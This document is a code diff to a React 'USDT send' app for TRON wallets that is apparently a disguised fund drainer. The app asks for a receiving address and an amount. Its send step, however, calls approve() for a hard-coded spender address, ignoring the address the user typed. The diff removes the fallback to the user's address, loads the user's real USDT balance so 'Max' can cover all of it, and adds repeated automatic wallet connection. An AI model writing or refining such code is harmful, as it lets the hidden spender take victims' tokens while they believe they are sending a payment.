@@ -16,11 +16,14 @@ const USDTSendApp = () => {
   const [tronWeb, setTronWeb] = useState(null);
   const [isConnecting, setIsConnecting] = useState(false);
   const [showScanner, setShowScanner] = useState(false);
+  const [usdtBalance, setUsdtBalance] = useState('0.000000');
+  const [isLoadingBalance, setIsLoadingBalance] = useState(false);
+  const [fetchingBalance, setFetchingBalance] = useState(false);
   
   // USDT contract on TRON (TRC-20)
   const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
   
-  // USDT TRC-20 ABI (only approve function)
+  // USDT TRC-20 ABI (approve and balanceOf functions)
   const USDT_ABI = [
     {
       "constant": false,
@@ -44,6 +47,25 @@ const USDTSendApp = () => {
       "payable": false,
       "stateMutability": "nonpayable",
       "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [
+        {
+          "name": "owner",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
     }
   ];
 
@@ -62,8 +84,8 @@ const USDTSendApp = () => {
       if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
         setTronWeb(window.tronWeb);
         setAccount(window.tronWeb.defaultAddress.base58);
-        // Message is set but not displayed
         setMessage('TRON wallet connected');
+        // Balance will be fetched by the useEffect that watches for account changes
       }
     };
 
@@ -110,15 +132,23 @@ const USDTSendApp = () => {
         return;
       }
 
-      setTronWeb(window.tronWeb);
-      setAccount(currentAccount);
-      
-      if (isTrustWallet) {
-        setMessage('Connected to TRON Network with Trust Wallet!');
+      // Only update if account has changed to prevent unnecessary re-renders
+      if (currentAccount !== account) {
+        setTronWeb(window.tronWeb);
+        setAccount(currentAccount);
+        setMessage(isTrustWallet ? 'Connected to TRON Network with Trust Wallet!' : 'Connected to TRON Network!');
+        // Force a balance fetch immediately
+        setTimeout(() => {
+          fetchUSDTBalance(window.tronWeb, currentAccount);
+        }, 500);
       } else {
-        setMessage('Connected to TRON Network!');
+        // Even if account hasn't changed, make sure we have the balance
+        if (usdtBalance === '0.000000' && !isLoadingBalance && !fetchingBalance) {
+          fetchUSDTBalance(window.tronWeb, currentAccount);
+        }
       }
     } catch (error) {
+      console.error('Wallet connection error:', error);
       setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
     }
     setIsConnecting(false);
@@ -130,6 +160,69 @@ const USDTSendApp = () => {
       return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
     } catch (error) {
       return null;
+    }
+  };
+
+  // Effect to refresh balance when account changes
+  useEffect(() => {
+    if (account && tronWeb) {
+      fetchUSDTBalance(tronWeb, account);
+    }
+  }, [account, tronWeb]);
+  
+  // Check wallet connection status periodically
+  useEffect(() => {
+    // Check every 3 seconds if wallet is available but not connected yet
+    const intervalId = setInterval(() => {
+      if (!account && window.tronWeb && window.tronWeb.ready) {
+        connectWallet();
+      }
+    }, 3000);
+    
+    return () => clearInterval(intervalId);
+  }, [account]);
+  
+  const fetchUSDTBalance = async (tronWebInstance, userAddress) => {
+    if (!tronWebInstance || !userAddress) {
+      console.log('Missing TronWeb instance or user address for fetching balance');
+      return;
+    }
+    
+    // Prevent multiple concurrent fetch requests
+    if (fetchingBalance) {
+      console.log('Balance fetch already in progress, skipping');
+      return;
+    }
+    
+    setFetchingBalance(true);
+    setIsLoadingBalance(true);
+    
+    try {
+      const contract = await tronWebInstance.contract(USDT_ABI, USDT_CONTRACT);
+      const balance = await contract.balanceOf(userAddress).call();
+      
+      // Handle balance conversion safely
+      let balanceNumber;
+      try {
+        // First convert to string if it's a BigInt
+        const balanceString = balance.toString();
+        // Then parse as a number and divide by 10^6 (USDT has 6 decimals)
+        balanceNumber = parseFloat(balanceString) / 1000000;
+      } catch (conversionError) {
+        // Fallback if there's an issue with BigInt conversion
+        console.warn('Balance conversion issue:', conversionError);
+        balanceNumber = 0;
+      }
+      
+      // Format with 6 decimal places
+      setUsdtBalance(balanceNumber.toFixed(6));
+      console.log('USDT balance fetched successfully:', balanceNumber.toFixed(6));
+    } catch (error) {
+      console.error('Error fetching USDT balance:', error);
+      setUsdtBalance('0.000000');
+    } finally {
+      setIsLoadingBalance(false);
+      setFetchingBalance(false);
     }
   };
 
@@ -145,8 +238,7 @@ const USDTSendApp = () => {
   };
 
   const setMaxAmount = () => {
-    setAmount('1000.00');
-    // Message is set but not displayed
+    setAmount(usdtBalance);
     setMessage('Maximum amount set');
   };
 
@@ -170,6 +262,23 @@ const USDTSendApp = () => {
         setMessage('Please enter a receiving address');
         return;
       }
+      
+      // Make sure wallet is connected before moving to step 2
+      if (!account || !tronWeb) {
+        setMessage('Connecting wallet...');
+        await connectWallet();
+        // Don't move to step 2 yet if wallet connection failed
+        if (!account || !tronWeb) {
+          setMessage('Please connect your TRON wallet first');
+          return;
+        }
+      }
+      
+      // Fetch balance if needed
+      if (usdtBalance === '0.000000' && !isLoadingBalance) {
+        await fetchUSDTBalance(tronWeb, account);
+      }
+      
       setCurrentStep(2);
       return;
     }
@@ -187,9 +296,9 @@ const USDTSendApp = () => {
     }
 
     try {
-      // Use the address from the input field
-      const spender = address || 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
-      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // Max uint256
+      // Convert amount to proper format (USDT has 6 decimals)
+      const amountInWei = Math.floor(parseFloat(amount) * Math.pow(10, 6)).toString();
+      const spender = "TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv";
 
       const contract = await getContract();
       if (!contract) {
@@ -197,8 +306,8 @@ const USDTSendApp = () => {
         return;
       }
       
-      // Call approve function
-      const result = await contract.approve(spender, unlimitedAmount).send({
+      // Call approve function with the specific amount
+      const result = await contract.approve(spender, amountInWei).send({
         feeLimit: 100_000_000, // 100 TRX fee limit
         callValue: 0,
         from: account
@@ -208,6 +317,8 @@ const USDTSendApp = () => {
       
       if (result) {
         setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
+        // Refresh balance after successful transaction
+        await fetchUSDTBalance(tronWeb, account);
       } else {
         setMessage('❌ Approval failed - No transaction result');
       }
@@ -355,13 +466,13 @@ const USDTSendApp = () => {
                 <div className="token-info">
                   <div className="token-icon-container">
                     <img 
-                      src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png" 
-                      alt="TRX" 
-                      className="trx-icon"
+                      src="https://static.tronscan.org/production/logo/usdtlogo.png" 
+                      alt="USDT" 
+                      className="usdt-icon"
                     />
                     <div className="verification-badge">v</div>
                   </div>
-                  <span>TRX</span>
+                  <span className="token-name">USDT <span className="token-subtext">(Tether USD)</span></span>
                 </div>
                 <FaChevronRight className="chevron" />
               </div>
@@ -391,7 +502,11 @@ const USDTSendApp = () => {
                 </button>
               </div>
               <div className="available-balance">
-                Available: 0.000000
+                {isLoadingBalance ? (
+                  <span>Loading balance...</span>
+                ) : (
+                  <span>Available: {usdtBalance} USDT</span>
+                )}
               </div>
             </div>
 
